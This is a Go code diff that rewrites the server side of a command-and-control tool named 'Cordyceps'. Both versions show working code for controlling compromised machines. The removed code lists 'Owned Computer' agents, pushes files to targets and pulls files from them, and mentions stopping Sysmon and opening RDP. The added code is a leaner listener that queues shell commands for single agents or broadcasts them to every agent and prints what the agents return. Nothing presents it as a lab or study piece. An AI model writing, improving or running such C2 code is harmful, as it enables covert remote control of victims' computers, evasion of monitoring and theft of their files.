@@ -1,258 +1,190 @@
 package main
 
 import (
-	commons "Cordyceps/commons/estruturas"
-	"Cordyceps/commons/helpers"
 	"bufio"
-	"encoding/gob"
 	"fmt"
-	"io/ioutil"
-	"log"
 	"net"
 	"os"
 	"strings"
+	"sync"
+	"time"
 )
+
+type agent struct {
+	id       string
+	ip       string
+	lastSeen time.Time
+	pending  []string
+}
 
 var (
-	agentesEmCampo    = []commons.Mensagem{}
-	agenteSelecionado = ""
+	mu       sync.Mutex
+	agents   = map[string]*agent{}
+	selected = ""
 )
 
-func main() {
-	fmt.Print(" ____                     __                                           \n")
-	fmt.Print("/\\  _`\\                  /\\ \\                                          \n")
-	fmt.Print("\\ \\ \\/\\_\\    ___   _ __  \\_\\ \\  __  __    ___     __   _____     ____  \n")
-	fmt.Print(" \\ \\ \\/_/_  / __`\\/\\`'__\\/\\'_` \\ /\\ \\/\\ \\  /'___\\ /'__`\\/\\ '__`\\  /',__\\ \n")
-	fmt.Print("  \\ \\ \\L\\ \\/\\ \\L\\ \\ \\ \\//\\ \\L\\ \\ \\ \\_\\ \\/\\ \\__//\\  __/\\ \\ \\L\\ \\/\\__, `\\\n")
-	fmt.Print("   \\ \\____/\\ \\____/\\ \\_\\\\ \\___,_\\`\\____ \\ \\____\\ \\____\\ \\ ,__/\\/\\____/\n")
-	fmt.Print("    \\/___/  \\/___/  \\/_/ \\/__,_ /`/___/> \\/____/\\/____/ \\ \\ \\/  \\/___/ \n")
-	fmt.Print("                                    /\\___/               \\ \\_\\        \n")
-	fmt.Print("     ")
-	println("--------------------Developed By V3x0r-------------------------")
-	println("")
-	println("")
-	println("")
-	//Escuta na porta 9090
-	go startListener("54321")
-	cliHandler()
+const onlineThreshold = 30 * time.Second
+
+func status(a *agent) string {
+	if time.Since(a.lastSeen) <= onlineThreshold {
+		return "ONLINE "
+	}
+	return "OFFLINE"
 }
 
-// ClI do C2
-func cliHandler() {
+func handleConn(conn net.Conn) {
+	defer conn.Close()
+	scanner := bufio.NewScanner(conn)
+	if !scanner.Scan() {
+		return
+	}
+	line := strings.TrimSpace(scanner.Text())
+	parts := strings.SplitN(line, " ", 3)
+
+	switch parts[0] {
+	case "CHECKIN":
+		if len(parts) < 2 {
+			return
+		}
+		id := parts[1]
+		mu.Lock()
+		a, ok := agents[id]
+		if !ok {
+			a = &agent{id: id, ip: conn.RemoteAddr().String()}
+			agents[id] = a
+			fmt.Printf("\n[+] %s  %s\n> ", id, a.ip)
+		}
+		a.lastSeen = time.Now()
+		var cmd string
+		if len(a.pending) > 0 {
+			cmd = a.pending[0]
+			a.pending = a.pending[1:]
+		}
+		mu.Unlock()
+		if cmd != "" {
+			fmt.Fprintf(conn, "CMD shell %s\n", cmd)
+		} else {
+			fmt.Fprintf(conn, "IDLE\n")
+		}
+
+	case "RESP":
+		if len(parts) < 3 {
+			return
+		}
+		id := parts[1]
+		output := parts[2]
+		fmt.Printf("\n[%s]\n%s\n> ", id, output)
+	}
+}
+
+func listen(port string) {
+	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
+	if err != nil {
+		fmt.Println("listen error:", err)
+		os.Exit(1)
+	}
 	for {
-		if agenteSelecionado != "" {
-			print(agenteSelecionado + "# ")
+		conn, err := ln.Accept()
+		if err != nil {
+			continue
+		}
+		go handleConn(conn)
+	}
+}
+
+func showAgents() {
+	mu.Lock()
+	defer mu.Unlock()
+	if len(agents) == 0 {
+		fmt.Println("no agents")
+		return
+	}
+	fmt.Printf("\n%-4s %-8s %-24s %-22s %s\n", "#", "STATUS", "ID", "IP", "LAST SEEN")
+	fmt.Println(strings.Repeat("-", 80))
+	i := 1
+	for _, a := range agents {
+		fmt.Printf("%-4d %-8s %-24s %-22s %s\n",
+			i, status(a), a.id, a.ip, a.lastSeen.Format("15:04:05"))
+		i++
+	}
+	fmt.Println()
+}
+
+func queueCmd(id, cmd string) {
+	mu.Lock()
+	defer mu.Unlock()
+	if a, ok := agents[id]; ok {
+		a.pending = append(a.pending, cmd)
+	}
+}
+
+func broadcast(cmd string) {
+	mu.Lock()
+	defer mu.Unlock()
+	for _, a := range agents {
+		a.pending = append(a.pending, cmd)
+	}
+	fmt.Printf("[broadcast] queued for %d agents\n", len(agents))
+}
+
+func cli() {
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		if selected != "" {
+			fmt.Printf("%s> ", selected)
 		} else {
-			// Nome do Servidor
-			print("Cordyceps> ")
+			fmt.Print("Cordyceps> ")
 		}
-		// Le o que foi digitado
-		reader := bufio.NewReader(os.Stdin)
-		// Detecta que o fim da linha é quando digita Enter\n
-		comandoCompleto, _ := reader.ReadString('\n')
-
-		//verifica o comando enviado
-		comandoSeparado := helpers.SeparaComando(comandoCompleto)
-		comandoBase := strings.TrimSpace(comandoSeparado[0])
-		//verifica se o comando enviado nao foi apenas um Enter
-		if len(comandoBase) > 0 {
-			switch comandoBase {
-			case "show":
-				showHandler(comandoSeparado)
-			case "select":
-				selectHandler(comandoSeparado)
-			case "help":
-				helpHandler(comandoSeparado)
-			case "send":
-				//Comando para upload
-				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
-					var erro error
-					arquivoParaEnviar := &commons.Arquivo{}
-					arquivoParaEnviar.Nome = comandoSeparado[1]
-					arquivoParaEnviar.Conteudo, erro = os.ReadFile(arquivoParaEnviar.Nome)
-					comandoSend := &commons.Commando{}
-					comandoSend.Comando = comandoSeparado[0]
-					comandoSend.Arquivo = *arquivoParaEnviar
-					if erro != nil {
-						log.Println("Error reading file: ", erro.Error())
-					} else {
-						agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
-					}
-				} else {
-					println("Specify the file to be uploaded")
-				}
-			case "get":
-				//Comando para dowload
-				if len(comandoSeparado) > 0 && agenteSelecionado != "" {
-					comandoSend := &commons.Commando{}
-					comandoSend.Comando = comandoCompleto
-
-					agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
-				} else {
-					println("Specify the file to be Dowaload")
-				}
-			case "exit":
-				exitHandler(comandoSeparado)
-			default:
-				if agenteSelecionado != "" {
-					//Envia o Comando para o agente selecionado
-					comando := commons.Commando{}
-					comando.Comando = comandoCompleto
-
-					for indice, agent := range agentesEmCampo {
-						if agent.AgentID == agenteSelecionado {
-							//Adicionar no mensagem o comando
-							agentesEmCampo[indice].Comandos = append(agentesEmCampo[indice].Comandos, *&comando)
-						}
-					}
-				} else {
-					log.Println("Invalid Command")
-				}
-			}
+		if !scanner.Scan() {
+			break
 		}
-	}
-}
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" {
+			continue
+		}
+		parts := strings.SplitN(line, " ", 3)
+		cmd := parts[0]
 
-func helpHandler(comando []string) {
-	if len(comando) > 0 {
-		println("Server Commands:")
-		println("show agents:           List all agents in exucation")
-		println("select + ID do agent:  Selects agent with specified id")
-		println("send:                  Send Files to Target")
-		println("get:                   Download Files to Host")
-		println("exit:                  Exite for Agente Selected")
-		println("stopsys:                  Stop Sysmon Service Running")
-		println("startsys:                  Start Sysmon Service Running")
-		println("rdp:                  Open Port And Service Remote Desktop")
-	} else {
-		println("Comando não Encontrado")
-	}
-}
-func showHandler(comando []string) {
-	if len(comando) > 1 {
-		switch comando[1] {
-		case "agents":
-			for _, agente := range agentesEmCampo {
-				if 1 == 1 {
-					println("Owned Computer: " + agente.AgentID)
-				} else {
-					println("Owned Computer with closed connection: " + agente.AgentID)
-				}
+		switch cmd {
+		case "show":
+			showAgents()
+		case "select":
+			if len(parts) < 2 {
+				fmt.Println("usage: select <id>")
+				continue
 			}
+			selected = parts[1]
+		case "exit":
+			selected = ""
+		case "broadcast":
+			if len(parts) < 2 {
+				fmt.Println("usage: broadcast <cmd>")
+				continue
+			}
+			rest := strings.Join(parts[1:], " ")
+			broadcast(rest)
+		case "shell":
+			if selected == "" {
+				fmt.Println("select an agent first")
+				continue
+			}
+			if len(parts) < 2 {
+				fmt.Println("usage: shell <cmd>")
+				continue
+			}
+			rest := strings.Join(parts[1:], " ")
+			queueCmd(selected, rest)
 		default:
-			log.Println("Command Passed Wrong, Use: show agents -a")
-		}
-	}
-}
-
-func selectHandler(comando []string) {
-	if len(comando) > 1 {
-		if agenteCadastrado(comando[1]) {
-			agenteSelecionado = comando[1]
-		} else {
-			log.Println("Agent not found, To list your agents use: show agents")
-		}
-	}
-
-}
-func exitHandler(comando []string) {
-	if len(comando) > 1 {
-		if agenteCadastrado(comando[1]) {
-		}
-	} else {
-		agenteSelecionado = ""
-	}
-}
-
-// Verifica se o Agent já esta cadastrado
-func agenteCadastrado(agentID string) (cadastrado bool) {
-	//Inicia como Falso
-	cadastrado = false
-	//Verifica o range de agents
-	for _, agente := range agentesEmCampo {
-		//Se o ID agent for igual
-		if agente.AgentID == agentID {
-			//Retorna agent True para cadastrado
-			cadastrado = true
-		}
-	}
-	return cadastrado
-}
-func mensagemContemResposta(mensagem commons.Mensagem) (contem bool) {
-	contem = false
-	for _, commando := range mensagem.Comandos {
-		if len(commando.Resposta) > 0 {
-			contem = true
-		}
-	}
-	return contem
-
-}
-
-func posicaoDoAgenteEmCampo(agentId string) (posicao int) {
-	for indice, agente := range agentesEmCampo {
-		if agentId == agente.AgentID {
-			posicao = indice
-		}
-	}
-	return posicao
-}
-func salvarArquivo(arquivo commons.Arquivo) {
-	err := ioutil.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)
-	if err != nil {
-		println("Erro ao Salvar Arquivo" + err.Error())
-	}
-}
-func startListener(port string) {
-	//0.0.0.0:9090 Abre Conexão TCP
-	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
-
-	if err != nil {
-		log.Fatal("Erro", err.Error())
-	} else {
-		for {
-			//Canal Aceita Conexões
-			canal, err := listener.Accept()
-			if err != nil {
-				log.Println("Erro:", err.Error())
-				//Fechar Canal quando não utilizar
-				defer canal.Close()
+			if selected != "" {
+				queueCmd(selected, line)
 			} else {
-				mensagem := &commons.Mensagem{}
-				gob.NewDecoder(canal).Decode(mensagem)
-
-				// Verificar se o Agent Está Instalado
-				if agenteCadastrado(mensagem.AgentID) {
-					if mensagemContemResposta(*mensagem) {
-						log.Println("Connected Computer ID:", mensagem.AgentID)
-						//Exibir resposta
-						for indice, commando := range mensagem.Comandos {
-							//log.Println("Comando:", commando.Comando)
-							println("Response:", commando.Resposta)
-							if helpers.SeparaComando(commando.Comando)[0] == "get" &&
-								mensagem.Comandos[indice].Arquivo.Erro == false {
-
-								salvarArquivo(mensagem.Comandos[indice].Arquivo)
-
-							} else {
-
-							}
-						}
-					}
-					// Envia a resposta para o Agent
-					gob.NewEncoder(canal).Encode(agentesEmCampo[posicaoDoAgenteEmCampo(mensagem.AgentID)])
-					// Zera a Lista de Comandos
-					agentesEmCampo[posicaoDoAgenteEmCampo(mensagem.AgentID)].Comandos = []commons.Commando{}
-				} else {
-					//Se não, mostra somente o ID do Agent
-					log.Println("New IP Connection:", canal.RemoteAddr().String(), "ID:", mensagem.AgentID)
-					agentesEmCampo = append(agentesEmCampo, *mensagem)
-					gob.NewEncoder(canal).Encode(mensagem)
-				}
-
+				fmt.Println("unknown command")
 			}
-
 		}
-
 	}
+}
+
+func main() {
+	go listen("54321")
+	cli()
 }
